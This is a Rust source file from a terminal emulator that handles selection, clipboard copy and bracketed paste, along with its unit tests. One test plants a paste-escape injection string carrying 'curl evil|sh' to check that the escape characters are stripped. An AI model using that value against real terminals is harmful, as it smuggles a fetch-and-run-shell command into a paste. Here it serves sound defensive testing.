//! Text selection, word selection, and clipboard copy/paste.

use crate::model::editor::PromptMode;
use crate::model::input::VisualKind;
use crate::model::layout::TabId;
use crate::model::palette::PaletteMode;

use super::super::overlay::Overlay;
use super::super::Selection;
use super::App;

// ========================================================================
// Constants
// ========================================================================

const WORD_CHARS: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.~/";

/// The markers a bracketed paste is sent between.
const PASTE_START: &[u8] = b"\x1b[200~";
const PASTE_END: &[u8] = b"\x1b[201~";

/// What a bracketed paste may not carry: ESC, and the one-byte CSI (U+009B)
/// some programs read as ESC `[`. Either would let pasted text close the
/// paste early and run the rest as typed commands.
const PASTE_ESCAPES: [char; 2] = ['\x1b', '\u{9b}'];

// ========================================================================
// Free functions
// ========================================================================

/// The bytes pasting `text` sends to a program. In bracketed mode the text is
/// stripped of [`PASTE_ESCAPES`], so a clipboard a program filled through
/// OSC 52 cannot hold its own `ESC [201~` and break out of the paste.
fn paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
    if !bracketed {
        return text.as_bytes().to_vec();
    }
    let mut bytes = Vec::with_capacity(text.len() + PASTE_START.len() + PASTE_END.len());
    bytes.extend_from_slice(PASTE_START);
    for c in text.chars().filter(|c| !PASTE_ESCAPES.contains(c)) {
        let mut utf8 = [0; 4];
        bytes.extend_from_slice(c.encode_utf8(&mut utf8).as_bytes());
    }
    bytes.extend_from_slice(PASTE_END);
    bytes
}

/// The status-bar message confirming a copy: line and character counts of
/// `text`, pluralized.
fn copy_confirmation(text: &str) -> String {
    let lines = text.lines().count();
    let chars = text.chars().count();
    format!(
        "Copied {lines} line{}, {chars} character{}",
        if lines == 1 { "" } else { "s" },
        if chars == 1 { "" } else { "s" },
    )
}

// ========================================================================
// App: clipboard & selection
// ========================================================================

impl App {
    /// The grid a selection over `tab` reads: the rows an editor last painted,
    /// else the terminal's own grid.
    ///
    /// An editor draws over a pane whose shell keeps running underneath, so the
    /// two grids hold different text. Resolving against the terminal's meant a
    /// drag over a listing highlighted nothing and copied whatever output was
    /// hidden behind it.
    ///
    /// Both are addressed the same way afterwards: an editor's grid has no
    /// scrollback, so `to_absolute_row` over it is the identity and
    /// `absolute_cell` is an ordinary cell lookup.
    pub(crate) fn selection_grid(&self, tab: TabId) -> Option<&winter_render::Grid> {
        match self
            .open_tabs
            .editor(&tab)
            .and_then(|slot| slot.painted.as_ref())
        {
            Some(painted) => Some(painted),
            None => self
                .open_tabs
                .terminal(&tab)
                .map(|terminal| terminal.grid()),
        }
    }

    /// Drop any selection held in `pane`, because what it names is about to
    /// stop being the text the user picked.
    ///
    /// A selection is a pair of absolute grid rows, which is enough to follow
    /// the text through Winter's own scrolling. It cannot follow a full-screen
    /// app scrolling its *own* content: from here that is an ordinary repaint,
    /// with the grid rows unmoved and different text now under them. The
    /// highlight would sit over whatever the app painted there, and copying it
    /// would yield text the user never pointed at, so the selection is dropped
    /// at the gesture that is about to cause the repaint. Other terminals
    /// resolve the same problem the same way.
    pub(crate) fn drop_selection_in_tab(&mut self, tab: TabId) {
        if self
            .selection
            .span
            .as_ref()
            .is_some_and(|sel| sel.tab == tab)
        {
            self.selection.span = None;
            self.dirty = true;
        }
    }

    /// The selected text, and its line/character counts. Rows in `self.selection.span`
    /// are absolute (see [`winter_render::Grid::to_absolute_row`]), so this reads
    /// via `absolute_cell` rather than the scroll-position-dependent `visible_cell`
    ///: a selection built up over an auto-scrolled drag stays correct however far
    /// the view has since scrolled.
    pub(crate) fn selected_text(&self) -> Option<String> {
        let sel = self.selection.span.as_ref()?;
        let grid = self.selection_grid(sel.tab)?;

        if sel.block {
            let (sr, er) = (
                sel.start_row.min(sel.end_row),
                sel.start_row.max(sel.end_row),
            );
            let (sc, ec) = (
                sel.start_col.min(sel.end_col),
                sel.start_col.max(sel.end_col),
            );
            let mut text = String::new();
            for row in sr..=er {
                let mut line = String::new();
                let col_end = (ec + 1).min(grid.cols());
                for col in sc..col_end {
                    let ch = grid.absolute_cell(row, col).map(|c| c.ch).unwrap_or(' ');
                    line.push(ch);
                }
                text.push_str(line.trim_end());
                if row < er {
                    text.push('\n');
                }
            }
            let trimmed = text.trim_end().to_string();
            return if trimmed.is_empty() {
                None
            } else {
                Some(trimmed)
            };
        }

        let (sr, sc, er, ec) = if (sel.start_row, sel.start_col) <= (sel.end_row, sel.end_col) {
            (sel.start_row, sel.start_col, sel.end_row, sel.end_col)
        } else {
            (sel.end_row, sel.end_col, sel.start_row, sel.start_col)
        };

        let mut text = String::new();
        for row in sr..=er {
            let indent = grid.absolute_row_wrap_indent(row);
            let col_start = if row == sr {
                sc
            } else if grid.absolute_row_wraps(row.saturating_sub(1)) {
                indent
            } else {
                0
            };
            let col_end = if row == er { ec + 1 } else { grid.cols() };
            let col_end = col_end.min(grid.cols());
            let mut line = String::new();
            for col in col_start..col_end {
                let ch = grid.absolute_cell(row, col).map(|c| c.ch).unwrap_or(' ');
                line.push(ch);
            }
            // A span running to the row's last column swept up the blank padding
            // past the text (every row of a linewise selection does); drop it, so
            // the copied lines end where their content does.
            if col_end >= grid.cols() {
                line.truncate(line.trim_end().len());
            }
            text.push_str(&line);
            if row < er && !grid.absolute_row_wraps(row) {
                text.push('\n');
            } else if row < er && grid.absolute_row_break(row).is_some() {
                // A word-wrapped row's continuation starts at its word; the
                // space the break consumed is not in any cell, so put it back
                // or the copied line glues two words together.
                text.push(' ');
            }
        }
        let trimmed = text.trim_end().to_string();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    }

    /// Recompute the highlighted selection from the Visual-mode anchor and the
    /// current nav cursor. Charwise spans anchor->cursor; linewise covers every
    /// column of the rows between them. The nav cursor's rows are viewport-
    /// relative, so both are converted to `Selection`'s absolute addressing
    /// (see [`winter_render::Grid::to_absolute_row`]) before storing.
    pub(crate) fn update_visual_selection(&mut self, focused: TabId) {
        let (Some((abs_ar, ac)), Some((cr, cc))) =
            (self.selection.visual_anchor, self.nav_cursor(focused))
        else {
            self.selection.span = None;
            return;
        };
        let Some(terminal) = self.open_tabs.terminal(&focused) else {
            return;
        };
        let grid = terminal.grid();
        let last_col = grid.cols().saturating_sub(1);
        // The anchor is already absolute; only the live cursor is a viewport row.
        let abs_cr = grid.to_absolute_row(cr);
        self.selection.span = Some(match self.selection.visual_kind {
            VisualKind::Block => Selection {
                block: true,
                end_col: cc,
                end_row: abs_cr,
                tab: focused,
                start_col: ac,
                start_row: abs_ar,
            },
            VisualKind::Line => Selection {
                block: false,
                end_col: last_col,
                end_row: abs_ar.max(abs_cr),
                tab: focused,
                start_col: 0,
                start_row: abs_ar.min(abs_cr),
            },
            VisualKind::Char => Selection {
                block: false,
                end_col: cc,
                end_row: abs_cr,
                tab: focused,
                start_col: ac,
                start_row: abs_ar,
            },
        });
    }

    /// The shared, long-lived clipboard handle, created on first use. Returns
    /// `None` if the platform clipboard is unavailable (e.g. a headless test).
    /// Reusing one handle keeps the Linux clipboard owner alive so written
    /// contents survive long enough for other apps and clipboard managers.
    pub(crate) fn clipboard(&mut self) -> Option<&mut arboard::Clipboard> {
        if self.clipboard.is_none() {
            self.clipboard = arboard::Clipboard::new().ok();
        }
        self.clipboard.as_mut()
    }

    /// Copy the current selection to the system clipboard and confirm it in the
    /// status bar with its line/character counts. A no-op (and no notice) when
    /// nothing is selected, so plain clicks that leave no selection stay silent.
    pub(crate) fn copy_selection(&mut self) {
        let Some(text) = self.selected_text() else {
            return;
        };
        let Some(clipboard) = self.clipboard() else {
            return;
        };
        let copied = clipboard.set_text(&text).is_ok();
        if copied {
            self.set_notice(copy_confirmation(&text));
        }
    }

    /// Copy the current selection to the X11/Wayland primary selection buffer.
    /// On non-Linux platforms this is a no-op.
    #[allow(unused_variables)]
    pub(crate) fn copy_selection_to_primary(&mut self) {
        let Some(text) = self.selected_text() else {
            return;
        };
        #[cfg(target_os = "linux")]
        {
            use arboard::{LinuxClipboardKind, SetExtLinux};
            if let Some(cb) = self.clipboard() {
                let _ = cb.set().clipboard(LinuxClipboardKind::Primary).text(text);
            }
        }
    }

    /// Paste text from the X11/Wayland primary selection buffer.
    /// On non-Linux platforms this falls back to the regular clipboard.
    pub(crate) fn paste_from_primary(&mut self) {
        if let Some(text) = self.get_primary_text() {
            self.paste_text(&text);
        }
    }

    fn get_primary_text(&mut self) -> Option<String> {
        let cb = self.clipboard()?;
        #[cfg(target_os = "linux")]
        {
            use arboard::{GetExtLinux, LinuxClipboardKind};
            cb.get().clipboard(LinuxClipboardKind::Primary).text().ok()
        }
        #[cfg(not(target_os = "linux"))]
        {
            cb.get_text().ok()
        }
    }

    pub(crate) fn clipboard_text(&mut self) -> Option<String> {
        self.clipboard().and_then(|cb| cb.get_text().ok())
    }

    pub(crate) fn paste_text(&mut self, text: &str) {
        let focused = self.layout().focused();
        if let Some(shadow) = self.open_tabs.prompt_shadow_mut(&focused) {
            shadow.desync();
        }
        let Some(terminal) = self.open_tabs.terminal_mut(&focused) else {
            return;
        };
        // Pasting is typing: show the prompt it lands on.
        if terminal.grid().scroll_offset() != 0 {
            terminal.grid_mut().set_scroll_offset(0);
            self.dirty = true;
        }
        let bytes = paste_bytes(text, terminal.bracketed_paste());
        terminal.write(&bytes);
    }

    /// Paste the clipboard wherever typing goes now (see
    /// [`Self::paste_into_focus`]).
    pub(crate) fn paste_from_clipboard(&mut self) {
        if let Some(text) = self.clipboard_text() {
            self.paste_into_focus(&text);
        }
    }

    /// Put `text` wherever typing goes now: the field of the dialog that is
    /// up, the palette's query, the settings row being edited, or else the
    /// focused tab, an editor or a terminal. A one-line input takes the first
    /// line; a question answered by a single key takes nothing.
    pub(crate) fn paste_into_focus(&mut self, text: &str) {
        let line = text.lines().next().unwrap_or_default();
        self.dirty = true;
        match &mut self.overlay {
            Some(Overlay::Close(_)) => {}
            Some(Overlay::Palette(_)) => self.paste_into_palette(line),
            Some(Overlay::Password(input)) => input.field.paste(text),
            Some(Overlay::Rename(input)) => input.field.paste(text),
            Some(Overlay::Settings(_)) => self.paste_into_settings(text),
            Some(Overlay::ThemeName(field) | Overlay::ZaiKey(field)) => field.paste(text),
            Some(Overlay::EditorPrompt(prompt)) => match prompt.request.mode {
                PromptMode::Confirm => {}
                PromptMode::Secret => prompt.field.paste(text),
                PromptMode::Search { .. } | PromptMode::Text => {
                    prompt.field.paste(text);
                    let tab = prompt.tab;
                    self.debounce_prompt_input(tab);
                }
            },
            None => self.paste_into_tab(text),
        }
    }

    /// Type `line` into the palette's query, as its keys would.
    fn paste_into_palette(&mut self, line: &str) {
        let Some(mut overlay) = self.take_palette_overlay() else {
            return;
        };
        let query = overlay.palette.query.clone();
        for c in line.chars() {
            overlay.palette.push_char(c);
        }
        let live = overlay.palette.active && overlay.palette.mode == PaletteMode::LiveSearch;
        if live && overlay.palette.query != query {
            self.on_live_query(&mut overlay.palette);
        }
        self.restore_palette_overlay(overlay);
    }

    /// Paste `text`'s first line into the settings row being edited, at its
    /// caret, when it takes text.
    fn paste_into_settings(&mut self, text: &str) {
        let Some(mut page) = self.take_settings_page() else {
            return;
        };
        if let Some((key, value)) = page.paste_text(text) {
            self.apply_settings_edit(&key, &value);
        }
        self.overlay = Some(Overlay::Settings(page));
    }

    /// Paste `text` into the focused tab: an editor takes it as it likes, a
    /// terminal as a paste its program reads.
    fn paste_into_tab(&mut self, text: &str) {
        let focused = self.layout().focused();
        let Some(slot) = self.open_tabs.editor_mut(&focused) else {
            return self.paste_text(text);
        };
        let outcome = slot.editor.on_paste(text.to_string());
        self.act_on_editor_outcome(focused, outcome);
    }

    /// `row` is the viewport row under the click; the resulting `Selection` is
    /// stored with its absolute row (see [`winter_render::Grid::to_absolute_row`]).
    pub(crate) fn select_word_at(&mut self, tab_id: TabId, row: usize, col: usize) {
        let Some(grid) = self.selection_grid(tab_id) else {
            return;
        };
        let abs_row = grid.to_absolute_row(row);
        let ch = grid.cell(row, col).map(|c| c.ch).unwrap_or(' ');
        if !WORD_CHARS.contains(ch) {
            self.selection.span = Some(Selection {
                block: false,
                start_row: abs_row,
                start_col: col,
                end_row: abs_row,
                end_col: col,
                tab: tab_id,
            });
            return;
        }
        let mut start = col;
        let mut end = col;
        while start > 0 {
            if let Some(c) = grid.cell(row, start - 1).map(|c| c.ch) {
                if WORD_CHARS.contains(c) {
                    start -= 1;
                } else {
                    break;
                }
            } else {
                break;
            }
        }
        while end < grid.cols() - 1 {
            if let Some(c) = grid.cell(row, end + 1).map(|c| c.ch) {
                if WORD_CHARS.contains(c) {
                    end += 1;
                } else {
                    break;
                }
            } else {
                break;
            }
        }
        self.selection.span = Some(Selection {
            block: false,
            start_row: abs_row,
            start_col: start,
            end_row: abs_row,
            end_col: end,
            tab: tab_id,
        });
    }
}

// ========================================================================
// Tests
// ========================================================================

#[cfg(test)]
mod tests {
    use std::cell::RefCell;
    use std::path::PathBuf;
    use std::rc::Rc;

    use crate::model::editor::{Editor, EditorOutcome, PromptRequest};
    use crate::model::input::Key;
    use crate::model::paint::{Frame, Span};
    use crate::model::palette::Palette;
    use crate::model::textedit::field::TextField;
    use crate::model::textedit::recall::Recall;

    use super::super::super::editor::{ActivePrompt, EditorKind};
    use super::super::super::overlay::{PasswordInput, RenameInput};
    use super::*;

    /// What every paste test pastes: a line, then one a one-line input drops.
    const CLIPBOARD: &str = "sk-123\nsecond line";

    /// An editor that keeps what is pasted into it.
    struct PastedEditor(Rc<RefCell<String>>);

    impl Editor for PastedEditor {
        fn title(&self) -> String {
            "Pasted".to_string()
        }

        fn content(&mut self, _rows: usize, _cols: usize, _wrap: bool) -> Frame {
            Frame::new(vec![vec![Span::plain("pasted")]])
        }

        fn on_key(&mut self, _key: &Key) -> EditorOutcome {
            EditorOutcome::Ignored
        }

        fn on_paste(&mut self, text: String) -> EditorOutcome {
            self.0.borrow_mut().push_str(&text);
            EditorOutcome::Consumed
        }
    }

    fn prompt(mode: PromptMode) -> Overlay {
        Overlay::EditorPrompt(ActivePrompt {
            buttons: match mode {
                PromptMode::Confirm => Some(crate::model::button::ButtonGroup::confirm()),
                _ => None,
            },
            field: TextField::line("find "),
            recall: Recall::default(),
            tab: TabId(0),
            request: PromptRequest {
                initial: String::new(),
                label: "find".to_string(),
                mode,
                tag: "search",
            },
        })
    }

    fn field_text(app: &App) -> Option<String> {
        match app.overlay.as_ref()? {
            Overlay::Password(input) => Some(input.field.text().to_string()),
            Overlay::Rename(input) => Some(input.field.text().to_string()),
            Overlay::ThemeName(field) | Overlay::ZaiKey(field) => Some(field.text().to_string()),
            Overlay::EditorPrompt(prompt) => Some(prompt.field.text().to_string()),
            Overlay::Palette(overlay) => Some(overlay.palette.query.clone()),
            Overlay::Close(_) | Overlay::Settings(_) => None,
        }
    }

    #[test]
    fn test_a_paste_lands_in_the_field_of_whichever_dialog_is_up() {
        let dialogs = [
            Overlay::ZaiKey(TextField::line("")),
            Overlay::ThemeName(TextField::line("")),
            Overlay::Password(PasswordInput {
                field: TextField::line(""),
                then: PathBuf::from("/"),
            }),
            Overlay::Rename(RenameInput::new(TabId(0), "")),
        ];
        for dialog in dialogs {
            let mut app = App::new();
            app.overlay = Some(dialog);
            app.paste_into_focus(CLIPBOARD);
            assert_eq!(
                field_text(&app).as_deref(),
                Some("sk-123"),
                "first line only"
            );
        }
    }

    #[test]
    fn test_a_paste_into_an_editor_s_question_is_searched_and_a_yes_or_no_takes_none() {
        let mut app = App::new();
        app.overlay = Some(prompt(PromptMode::Text));
        app.paste_into_focus(CLIPBOARD);
        assert_eq!(field_text(&app).as_deref(), Some("find sk-123"));
        assert!(app.prompt_debounce.is_some(), "handed on as typing is");

        let mut app = App::new();
        app.overlay = Some(prompt(PromptMode::Confirm));
        app.paste_into_focus(CLIPBOARD);
        assert_eq!(
            field_text(&app).as_deref(),
            Some("find "),
            "answered by a key"
        );
    }

    #[test]
    fn test_a_paste_types_into_the_palette_rather_than_the_tab_behind_it() {
        let mut app = App::new();
        app.open_palette(Palette::open(&app.keymap));
        app.paste_into_focus("tab\nmore");
        assert_eq!(field_text(&app).as_deref(), Some("tab"));
    }

    #[test]
    fn test_a_paste_with_nothing_up_goes_to_the_focused_editor() {
        let pasted = Rc::new(RefCell::new(String::new()));
        let mut app = App::new();
        app.show_editor(EditorKind::Proc, Box::new(PastedEditor(Rc::clone(&pasted))));
        app.paste_into_focus(CLIPBOARD);
        assert_eq!(*pasted.borrow(), CLIPBOARD, "the editor takes every line");
    }

    #[test]
    fn test_word_chars_contains_alphanumeric() {
        assert!(WORD_CHARS.contains('a'));
        assert!(WORD_CHARS.contains('Z'));
        assert!(WORD_CHARS.contains('0'));
        assert!(WORD_CHARS.contains('_'));
        assert!(!WORD_CHARS.contains(' '));
    }

    #[test]
    fn test_copy_confirmation_pluralizes_multiple_lines_and_chars() {
        assert_eq!(copy_confirmation("ab\ncd"), "Copied 2 lines, 5 characters");
    }

    #[test]
    fn test_copy_confirmation_singular_for_one_line_one_char() {
        assert_eq!(copy_confirmation("a"), "Copied 1 line, 1 character");
    }

    #[test]
    fn test_copy_confirmation_counts_unicode_scalars_not_bytes() {
        // Regression: counting `text.len()` (bytes) instead of `.chars()`
        // would report a multi-byte-per-char string (e.g. emoji, accented
        // Latin) as having far more "characters" than a user actually typed
        // or selected.
        assert_eq!(copy_confirmation("héllo"), "Copied 1 line, 5 characters");
    }

    /// An app whose focused pane holds `line` on its top row, in Visual mode with
    /// the anchor at `anchor` and the nav cursor at `cursor` (both viewport cols).
    fn app_with_visual_selection(line: &str, anchor: usize, cursor: usize) -> crate::app::App {
        let mut app = crate::app::App::new();
        app.config.status_bar.enabled = true;
        let id = app.layout().shown_tabs()[0];
        let mut terminal = crate::terminal::session::Terminal::with_command(
            20,
            4,
            portable_pty::CommandBuilder::new("cat"),
            winter_render::MAX_SCROLLBACK,
        )
        .expect("test pane spawn");
        {
            let grid = terminal.grid_mut();
            grid.move_to(0, 0);
            for ch in line.chars() {
                grid.print(ch);
            }
        }
        app.open_tabs.insert_terminal(id, terminal);
        app.open_tabs
            .set_mode(&id, crate::model::mode::Mode::Visual);
        app.selection.visual_anchor = Some((0, anchor));
        app.set_nav_cursor(id, (0, cursor));
        app.update_visual_selection(id);
        app
    }

    /// A pane whose grid holds `lines`, one per row, with the oldest pushed
    /// into scrollback once they overflow the viewport.
    fn app_with_scrollback(lines: &[&str], rows: usize) -> (App, TabId) {
        let mut app = App::new();
        let id = app.layout().shown_tabs()[0];
        let mut terminal = crate::terminal::session::Terminal::with_command(
            20,
            rows,
            portable_pty::CommandBuilder::new("cat"),
            winter_render::MAX_SCROLLBACK,
        )
        .expect("test pane spawn");
        {
            let grid = terminal.grid_mut();
            for (i, line) in lines.iter().enumerate() {
                if i > 0 {
                    grid.line_feed();
                    grid.carriage_return();
                }
                for ch in line.chars() {
                    grid.print(ch);
                }
            }
        }
        app.open_tabs.insert_terminal(id, terminal);
        // Normal, not Visual: `Action::EnterVisual` toggles, so a pane already
        // in Visual would leave it instead of anchoring.
        app.open_tabs
            .set_mode(&id, crate::model::mode::Mode::Normal);
        (app, id)
    }

    #[test]
    fn test_visual_anchor_holds_its_line_when_the_cursor_scrolls() {
        // `v` anchors on the text under the cursor. Walking up past the top of
        // the viewport scrolls history, and the anchor has to keep naming the
        // line it was placed on. Held viewport-relative it slid by exactly the
        // scroll distance, so the highlight detached from where `v` was pressed.
        use crate::model::input::{Action, CursorMove, VisualKind};

        let (mut app, id) = app_with_scrollback(&["aaa", "bbb", "ccc", "ddd", "eee", "fff"], 3);
        // Top visible row is absolute row 3 ("ddd"): three lines are in scrollback.
        app.set_nav_cursor(id, (0, 0));
        app.handle_action(Action::EnterVisual(VisualKind::Char), id);
        let anchored = app.selection.span.as_ref().expect("selection").start_row;
        assert_eq!(anchored, 3, "anchor should sit on absolute row 3");

        // Each `k` from the top edge scrolls one more line of history into view.
        for _ in 0..2 {
            app.handle_action(Action::MoveCursor(CursorMove::Up), id);
        }
        assert_eq!(
            app.open_tabs.terminal(&id).unwrap().grid().scroll_offset(),
            2,
            "the motion should have scrolled history"
        );
        assert_eq!(
            app.selection.span.as_ref().expect("selection").start_row,
            anchored,
            "the anchor drifted with the viewport instead of holding its line"
        );
    }

    #[test]
    fn test_visual_selection_includes_the_character_under_the_cursor() {
        // Vim's charwise Visual is inclusive at both ends, so `v` then two `l`
        // yanks three characters: the cell the cursor sits on is part of it.
        let app = app_with_visual_selection("abcdef", 0, 2);
        assert_eq!(app.selected_text().as_deref(), Some("abc"));
    }

    #[test]
    fn test_visual_selection_backwards_also_includes_the_cursor_cell() {
        // Extending left of the anchor keeps both endpoints: cols 1..=4.
        let app = app_with_visual_selection("abcdef", 4, 1);
        assert_eq!(app.selected_text().as_deref(), Some("bcde"));
    }

    #[test]
    fn test_selected_text_joins_soft_wrapped_lines_and_skips_hanging_indent() {
        let mut app = App::new();
        let id = app.layout().shown_tabs()[0];
        let mut terminal = crate::terminal::session::Terminal::with_command(
            10,
            4,
            portable_pty::CommandBuilder::new("cat"),
            winter_render::MAX_SCROLLBACK,
        )
        .expect("test pane spawn");
        {
            let grid = terminal.grid_mut();
            grid.set_wrap_indent(true);
            grid.set_word_wrap(false);
            grid.move_to(0, 0);
            for ch in "  01234567XYZ".chars() {
                grid.print(ch);
            }
        }
        app.open_tabs.insert_terminal(id, terminal);
        app.open_tabs
            .set_mode(&id, crate::model::mode::Mode::Visual);
        // Anchor at row 0, col 0; cursor at row 1, col 4 ("Z")
        app.selection.visual_anchor = Some((0, 0));
        app.set_nav_cursor(id, (1, 4));
        app.update_visual_selection(id);

        // Soft-wrapped rows should join without newline and skip the hanging indent of 2 spaces
        assert_eq!(app.selected_text().as_deref(), Some("  01234567XYZ"));
    }

    #[test]
    fn test_selected_text_puts_the_space_back_at_a_word_wrap_join() {
        // A word-wrapped row's continuation starts at its word; the space the
        // break consumed lives in no cell, so the join has to reinsert it or
        // the copied line glues two words together.
        let mut app = App::new();
        let id = app.layout().shown_tabs()[0];
        let mut terminal = crate::terminal::session::Terminal::with_command(
            10,
            4,
            portable_pty::CommandBuilder::new("cat"),
            winter_render::MAX_SCROLLBACK,
        )
        .expect("test pane spawn");
        {
            let grid = terminal.grid_mut();
            grid.set_wrap_indent(false);
            grid.move_to(0, 0);
            for ch in "aaa bbbbbbb".chars() {
                grid.print(ch);
            }
        }
        app.open_tabs.insert_terminal(id, terminal);
        app.open_tabs
            .set_mode(&id, crate::model::mode::Mode::Visual);
        // Anchor at row 0, col 0; cursor at row 1, col 6 (the last b)
        app.selection.visual_anchor = Some((0, 0));
        app.set_nav_cursor(id, (1, 6));
        app.update_visual_selection(id);

        assert_eq!(app.selected_text().as_deref(), Some("aaa bbbbbbb"));
    }

    #[test]
    fn test_a_bracketed_paste_cannot_end_itself_early() {
        // What a program could have put on the clipboard through OSC 52.
        let planted = "ls\x1b[201~curl evil|sh\n\u{9b}201~";
        let bytes = paste_bytes(planted, true);
        assert!(bytes.starts_with(PASTE_START));
        assert!(bytes.ends_with(PASTE_END));
        let inner = &bytes[PASTE_START.len()..bytes.len() - PASTE_END.len()];
        assert_eq!(inner, "ls[201~curl evil|sh\n201~".as_bytes());
        // Unbracketed, a paste is typing, and goes as it is.
        assert_eq!(paste_bytes("a\x1bb", false), b"a\x1bb");
    }
}
